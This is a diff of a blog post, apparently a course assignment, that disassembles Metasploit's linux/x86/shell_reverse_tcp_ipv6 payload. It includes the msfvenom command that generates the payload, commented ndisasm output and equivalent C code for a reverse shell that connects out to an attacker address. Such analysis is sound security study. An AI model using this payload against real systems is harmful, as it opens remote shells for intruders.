@@ -23,7 +23,7 @@ List of files:
 
 I chose the following 4 shellcode samples:
 
-<!--kg-card-begin: html--><table>
+<table>
 <thead>
 <tr>
 <th>Name</th>
@@ -48,7 +48,9 @@ I chose the following 4 shellcode samples:
 <td>Connect back to attacker and spawn a command shell over IPv6</td>
 </tr>
 </tbody>
-</table><!--kg-card-end: html-->In this post I'll analyse `linux/x86/shell_reverse_tcp_ipv6`.
+</table>
+
+In this post I'll analyse `linux/x86/shell_reverse_tcp_ipv6`.
 
 ### NDISASM
 
@@ -56,14 +58,12 @@ To generate the payload:
 
 ```bash
 msfvenom -p linux/x86/shell_reverse_tcp_ipv6 LHOST=fe80::250:56ff:fe22:364b LPORT=4444 -o shellcode.bin
-
 ```
 
 To analyze it with `ndisasm`:
 
 ```bash
 ndisasm shellcode.bin -b 32 -p intel
-
 ```
 
 It returns the following output (comments are mine though):
@@ -72,7 +72,6 @@ It returns the following output (comments are mine though):
                             ; EDX:EAX = EBX * 0
 00000000  31DB              xor ebx,ebx
 00000002  F7E3              mul ebx
-
 ```
 
 <figcaption class="figure-caption">Useful for polymorphism: besides `EBX`, they clear `EAX` and `EDX` too</figcaption>
@@ -96,7 +95,6 @@ It returns the following output (comments are mine though):
 
                             ; C code: socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 00000010  CD80              int 0x80
-
 ```
 
 The instructions above create a `TCP` socket based on the `IPv6` protocol. The return value, stored into the register `EAX` (and later moved into `ESI`), is a file descriptor.
@@ -109,7 +107,6 @@ The instructions above create a `TCP` socket based on the `IPv6` protocol. The r
 00000014  31C9              xor ecx,ecx
 00000016  31DB              xor ebx,ebx
 00000018  53                push ebx
-
 ```
 
 <figcaption class="figure-caption">I don't know exactly why the author pushed the DWORD `0x00000000` two times, thus making the struct 32-bytes long, when the size should be only 28 bytes. If you know, please contact me.</figcaption>
@@ -125,7 +122,6 @@ The instructions above create a `TCP` socket based on the `IPv6` protocol. The r
 0000001F  68025056FF        push dword 0xff565002
 00000024  6A00              push byte +0x0
 00000026  68FE800000        push dword 0x80fe
-
 ```
 
 <figcaption class="figure-caption">Bytes in `big-endian` order representing the IPv6 address: `fe80::250:56ff:fe22:364b`</figcaption>
@@ -175,7 +171,6 @@ The instructions above create a `TCP` socket based on the `IPv6` protocol. The r
 
                             ; call socketcall() syscall, in turn calling connect(...)
 00000044  CD80              int 0x80
-
 ```
 
 The disassembly I analyzed up until now can be converted into the following C code:
@@ -198,7 +193,6 @@ inet_pton(AF_INET6, "fe80::250:56ff:fe22:364b", &amp;(addr.sin6_addr));
 
 // connect to fe80::250:56ff:fe22:364b:4444
 connect(fd, (struct sockaddr *)&amp;addr, sizeof(addr));
-
 ```
 
 So, first it creates a `TCP socket` based on the `IPv6` protocol.
@@ -239,7 +233,6 @@ Next, the function `dup2` is used for redirecting file descriptors.
                             ; call syscall dup2()
 00000052  B03F              mov al,0x3f
 00000054  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">Redirect `stdin` to the previously-created socket</figcaption>
@@ -257,7 +250,6 @@ Next, the function `dup2` is used for redirecting file descriptors.
                             ; call syscall dup2()
 0000005B  B03F              mov al,0x3f
 0000005D  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">Redirect `stdout` to the previously-created socket&nbsp;</figcaption>
@@ -274,7 +266,6 @@ Next, the function `dup2` is used for redirecting file descriptors.
 
 00000064  B03F              mov al,0x3f
 00000066  CD80              int 0x80
-
 ```
 
 <figcaption class="figure-caption">Redirect `stderr` to the previously-created socket</figcaption>
@@ -285,7 +276,6 @@ So far the disassembly I analyzed is equal to the following C code:
 dup2(fd, 0);
 dup2(fd, 1);
 dup2(fd, 2);
-
 ```
 
 Next, a shell is spawned.
@@ -321,7 +311,6 @@ Next, a shell is spawned.
                             ; call execve() syscall
 0000007D  B00B              mov al,0xb
 0000007F  CD80              int 0x80
-
 ```
 
 As for the second assignment, once the shellcode correctly redirected `stdin`, `stdout`, and `stderr` to the file descriptor of the server socket (a `metasploit` handler to be specific), it uses `execve` to spawn the reverse shell.
@@ -353,7 +342,6 @@ If the shellcode can't connect to the remote server, then it jumps to the addres
                             ; call nanosleep()
 0000008B  B0A2              mov al,0xa2
 0000008D  CD80              int 0x80
-
 ```
 
 The interesting fact about `nanosleep` is that it doesn't simply use a integer to determine how many seconds/nanoseconds to sleep, but it uses a `struct`.
@@ -365,7 +353,6 @@ struct timespec {
     time_t tv_sec;        /* seconds */
     long   tv_nsec;       /* nanoseconds */
 };
-
 ```
 
 Based on a few files of the Linux kernel, the size of `time_t` should be `4 bytes` on 32-bit `x86` systems, same for the `long` type. So we're looking at a struct made out of `8 bytes`.
@@ -394,7 +381,6 @@ Let's look again at the struct:
                             ; 1st argument of nanosleep():
                             ;   pointer to a timespec structure
 00000089  89E3              mov ebx,esp
-
 ```
 
 Once the shellcode sleeps `10 seconds`, it goes back attempting to connect to the remote server (address `00000014`):
@@ -405,7 +391,6 @@ Once the shellcode sleeps `10 seconds`, it goes back attempting to connect to th
 
                             ; apparently, this instruction is never going to be executed 
 00000094  C3                ret
-
 ```
 
 Finally, there are some instructions that call the syscall `exit()`, in order to exit gracefully.
@@ -415,7 +400,6 @@ Finally, there are some instructions that call the syscall `exit()`, in order to
 00000095  31C0              xor eax,eax
 00000097  B001              mov al,0x1
 00000099  CD80              int 0x80
-
 ```
 
 From what it seems, this last syscall is never executed. In fact, there are only two possibilities:
